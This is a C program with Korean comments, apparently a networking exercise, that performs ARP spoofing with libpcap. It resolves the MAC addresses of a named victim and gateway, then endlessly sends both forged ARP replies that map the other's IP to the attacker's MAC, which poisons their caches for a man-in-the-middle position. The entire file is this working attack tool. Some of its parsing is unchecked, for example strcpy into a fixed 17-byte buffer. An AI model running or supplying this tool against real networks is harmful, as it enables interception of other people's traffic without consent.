#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/types.h>
#include <ifaddrs.h>
#include <arpa/inet.h>
#include <pcap.h>

#define HW_ADDR_LEN 6 //하드웨어
#define PTL_ADDR_LEN 4 //프로토콜
#define EN_ADDR_LEN 6 //이더넷
#define PTL_HW_TYPE_LEN 2 //프로토콜 하드웨어 타입
#define PTL_HW__LEN 1 //프로토콜 하드웨어 길이

typedef struct _ethernet
{
    unsigned char dst_en_add[EN_ADDR_LEN];
    unsigned char src_en_add[EN_ADDR_LEN];
    unsigned char prt_type[PTL_HW_TYPE_LEN];
}ethernet;//14바이트 이더넷 헤더

typedef struct _arphd
{
    unsigned char hw_type[PTL_HW_TYPE_LEN];
    unsigned char ptl_type[PTL_HW_TYPE_LEN];
    unsigned char hw_len[PTL_HW__LEN];
    unsigned char ptl_len[PTL_HW__LEN];
    unsigned char op[2];
    unsigned char src_hw_add[HW_ADDR_LEN];
    unsigned char src_ptl_add[PTL_ADDR_LEN];
    unsigned char dst_hw_add[HW_ADDR_LEN];
    unsigned char dst_ptl_add[PTL_ADDR_LEN];
}arphd;//28바이트 ARP 헤더

typedef struct _arp
{
    struct _ethernet ethernet;
    struct _arphd arphd;
}arp;//두 구조체를 저장

void usage() {
    printf("syntax: pcap-test <interface> <IP> <GW>\n");
    printf("sample: pcap-test wlan0 10.0.1.101 10.0.1.1\n");
}//사용법 출력함수

typedef struct {
    char* dev_;
} Param; //이름을 저장할 구조체 필드

Param param = {
    .dev_ = NULL
};//구조체 필드 초기화

bool parse(Param* param, int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return false;
    }
    param->dev_ = argv[1];
    return true;
}//조건 불만족시 사용법 출력과 함께 false 반환
//조건 만족시 네트워크 인터페이스 이름 저장과 true 반환

int main(int argc, char *argv[]){
    Param param = { .dev_ = NULL };
    if (!parse(&param, argc, argv))
        return -1;//파싱 함수 호출 실패시 프로그램 종료
    int temp ; //임시저장소
    int sock; //소켓 디스크립터 변수 선언
    struct ifreq ifr; // ifreq 구조체 변수 선언
    unsigned char *mac = NULL; // mac 주소를 저장할 char 포인터 변수
    struct ifaddrs *addrs, *tmp; // 네트워크 인터페이스 정보를 저장하고 반복하는 데 사용되는 구조체 변수
    struct sockaddr_in *sa; // IPv4 주소 정보를 저장하는 구조체
    char *addr;
    int temp2 = 0; //임시저장
    int temp3[4];//임시저장 배열
    int temp4=0;
    int ty = 0;// 0==피해자의 mac주소 가져오는 과정 1==gateway 가져오는 과정 2==피해자를 속이는 과정 3==게이트웨이를 속이고 조건문에 오면 반복함
    uint8_t iptemp[3];
    unsigned char tempip [17]; //피해자 IP
    unsigned char pmactemp[10];//피해자의 mac주소 보관
    unsigned char gmactemp[10];//게이트웨이의 mac주소 보관
    char errbuf[PCAP_ERRBUF_SIZE];//오류 메시지 저장 배열
    pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;//오류 메시지 출력과 함께 프로그램 종료
    }

    getifaddrs(&addrs);
    tmp = addrs;

    // 네트워크 인터페이스 목록을 반복하며 IPv4 주소 정보를 출력
    while (tmp){
        if (tmp->ifa_addr && tmp->ifa_addr->sa_family == AF_INET){
            sa = (struct sockaddr_in*)tmp->ifa_addr;
            addr = inet_ntoa(sa->sin_addr);
        }
        tmp = tmp->ifa_next;
    }
    // getifaddrs로 얻은 정보를 메모리에서 해제
    freeifaddrs(addrs);

    // 명령줄 매개변수로 네트워크 인터페이스 이름과 IP GW를 받음
    if(argc != 4){
        printf("interface name input");
        return 1;
    }

    memset(&ifr,0x00,sizeof(ifr)); // ifr 구조체 초기화
    strcpy(ifr.ifr_name, argv[1]); // ifr 구조체에 사용자가 입력한 인터페이스 이름 복사

    sock = socket(AF_INET, SOCK_STREAM, 0); // 소켓 생성

    if(sock < 0 ){ // 소켓 생성 오류 확인
        printf("socket error");
        return 1;
    }
    if(ioctl(sock,SIOCGIFHWADDR,&ifr)<0){ // ioctl로 네트워크 인터페이스의 MAC 주소 얻기
        printf("ioctl error");
        return 1;
    }

    mac = ifr.ifr_hwaddr.sa_data;
    printf("%s\n",addr);
    printf("%02x:%02x:%02x:%02x:%02x:%02x\n",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
    while (true) {
        uint8_t buffer[60];
        struct pcap_pkthdr* header;
        const u_char* packet;
        ethernet eth;
        arphd ah;
        arp ap;
        int packetindex = sizeof(ethernet) + sizeof(arphd);
        //이더넷 헤더
        if (ty <= 1) {
            for(int i = 0; i < 6; i++) {
                eth.dst_en_add[i] = 0xFF;//브로드 캐스트
            }
        }
        else if (ty == 2) {
            for (int i = 0; i < 6; i++) {
                eth.dst_en_add[i] = pmactemp[i];//목적지 피해자 mac
            }
        }
        else if (ty == 3) {
            for (int i = 0; i < 6; i++) {
                eth.dst_en_add[i] = gmactemp[i];//목적지 gateway mac
            }
        }
        for (int i = 0; i < 6; i++) {
            eth.src_en_add[i] = mac[i];//내 mac주소
        }
        eth.prt_type[0] = 0x08;
        eth.prt_type[1] = 0x06;
        //arp 헤더
        ah.hw_type[0] = 0x00;// 이더넷을 사용하기 때문에 00 01
        ah.hw_type[1] = 0x01;
        ah.ptl_type[0] = 0x08;// IPv4 이기 때문에 08 00
        ah.ptl_type[1] = 0x00;
        ah.hw_len[0] = 0x06;//mac 주소의 길이값
        ah.ptl_len[0] = 0x04;//IPv4의 길이값
        ah.op[0] = 0x00;
        if (ty <= 1) {//mac값을 알아내는 과정
            ah.op[1] = 0x01;//요청이기 때문에 00 01
        }
        else {
            ah.op[1] = 0x02;//reply이기 때문에 00 02
        }
        for (int i = 0; i < 6; i++) {
            ah.src_hw_add[i] = mac[i];//내 mac주소
        }
        if (ty <= 1) {
            for (int i = 0; i < 17; i++) {//내 IP주소
                if (addr[i] == '.' || addr[i] == NULL) {
                    if (temp2 == 1) {
                        temp = temp3[temp2 - 1];
                        temp2 = 0;
                    }
                    else if (temp2 == 2) {
                        temp = (10 * temp3[temp2 - 2] + temp3[temp2 - 1]);
                        temp2 = 0;
                    }
                    else if (temp2 == 3) {
                        temp = (100 * temp3[temp2 - 3] + 10 * temp3[temp2 - 2] + temp3[temp2 - 1]);
                        temp2 = 0;
                    }
                    temp2 = 0;
                    sprintf(iptemp, "%02x", temp);
                    sscanf(iptemp, "%hhx", &ah.src_ptl_add[temp4]);
                    temp4 += 1;
                    if (addr[i] == NULL) {
                        temp4 = 0;
                        temp2 = 0;
                        break;
                    }
                }
                else {
                    temp3[temp2] = (addr[i] - '0');
                    temp2 += 1;
                }
            }
        }
        else {
            if (ty == 2) {
                strcpy(tempip, argv[3]);
            }
            else if (ty == 3) {
                strcpy(tempip, argv[2]);
            }
            for (int i = 0; i < 17; i++) {//속일 IP주소
                if (tempip[i] == '.' || tempip[i] == NULL) {
                    if (temp2 == 1) {
                        temp = temp3[temp2 - 1];
                        temp2 = 0;
                    }
                    else if (temp2 == 2) {
                        temp = (10 * temp3[temp2 - 2] + temp3[temp2 - 1]);
                        temp2 = 0;
                    }
                    else if (temp2 == 3) {
                        temp = (100 * temp3[temp2 - 3] + 10 * temp3[temp2 - 2] + temp3[temp2 - 1]);
                        temp2 = 0;
                    }
                    temp2 = 0;
                    sprintf(iptemp, "%02x", temp);
                    sscanf(iptemp, "%hhx", &ah.src_ptl_add[temp4]);
                    temp4 += 1;
                    if (tempip[i] == NULL) {
                        temp4 = 0;
                        temp2 = 0;
                        break;
                    }
                }
                else {
                    temp3[temp2] = (tempip[i] - '0');
                    temp2 += 1;
                }
            }
        }
        if (ty <= 1) {
            for (int i = 0; i < 6; i++) {
                ah.dst_hw_add[i] = 0x00;//도착지 mac 주소
            }
        }
        else if (ty == 2) {
            for (int i = 0; i < 6; i++) {
                ah.dst_hw_add[i] = pmactemp[i];//도착지 mac 주소
            }
        }
        else if (ty == 3) {
            for (int i = 0; i < 6; i++) {
                ah.dst_hw_add[i] = gmactemp[i];//도착지 mac 주소
            }
        }
        if (ty == 0) {
            strcpy(tempip, argv[2]);
        }
        else if (ty == 1) {
            strcpy(tempip, argv[3]);
        }
        else if (ty == 2) {
            strcpy(tempip, argv[2]);
        }
        else if (ty == 3) {
            strcpy(tempip, argv[3]);
        }
        for (int i = 0; i < 17; i++) {//도착지 IP주소
            if (tempip[i] == '.' || tempip[i] == NULL) {
                if (temp2 == 1) {
                    temp = temp3[temp2 - 1];
                    temp2 = 0;
                }
                else if (temp2 == 2) {
                    temp = (10 * temp3[temp2 - 2] + temp3[temp2 - 1]);
                    temp2 = 0;
                }
                else if (temp2 == 3) {
                    temp = (100 * temp3[temp2 - 3] + 10 * temp3[temp2 - 2] + temp3[temp2 - 1]);
                    temp2 = 0;
                }
                temp2 = 0;
                sprintf(iptemp, "%02x", temp);
                sscanf(iptemp, "%hhx", &ah.dst_ptl_add[temp4]);
                temp4 += 1;
                if (tempip[i] == NULL) {
                    temp4 = 0;
                    temp2 = 0;
                    break;
                }
            }
            else {
                temp3[temp2] = (tempip[i] - '0');
                temp2 += 1;
            }
        }
        ap.ethernet = eth;
        ap.arphd = ah;
        memcpy(&buffer, &ap, packetindex);
        for (int i = 42; i < 60; i++)
        {
            buffer[i] = 0x00;
        }
        int dump=0;
        for (int i = 0; i < 60; i++)
        {
            printf("%02x ", buffer[i]);
            dump += 1;
            if (dump % 16 == 0) {
                printf("\n");
            }
        }
        if(pcap_sendpacket(pcap,buffer,60)!=0){
            printf("send fail\n");
        }
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;//패킷 값 기다리기
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            return -1;//오류 메시지 출력과 함께 종료
        }
        if (ty == 0) {
            ethernet* ethp = (ethernet*)packet;//이더넷에 패킷 값 14바이트만큼 저장
            arphd* ahp = (arphd*)(packet + sizeof(ethernet));//이더넷에 저장한 부분 제외하고 저장
            printf("\n");
            for (int i = 0; i < 6; i++) {
                pmactemp[i] = ahp->src_hw_add[i];
                printf("!!%02x!!\n", pmactemp[i]);
            }
        }
        else if (ty == 1) {
            ethernet* ethg = (ethernet*)packet;//이더넷에 패킷 값 14바이트만큼 저장
            arphd* ahg = (arphd*)(packet + sizeof(ethernet));//이더넷에 저장한 부분 제외하고 저장
            printf("\n");
            for (int i = 0; i < 6; i++) {
                gmactemp[i] = ahg->src_hw_add[i];
                printf("!!%02x!!\n", gmactemp[i]);
            }
        }
        if (ty == 0) {
            ty = 1;
            continue;
        }
        else if (ty == 1) {
            ty = 2;
            continue;
        }
        else if (ty == 2) {
            ty = 3;
            continue;
        }
        else if(ty == 3){
            ty = 2;
            continue;
        }
        break;
    }
    pcap_close(pcap);
}
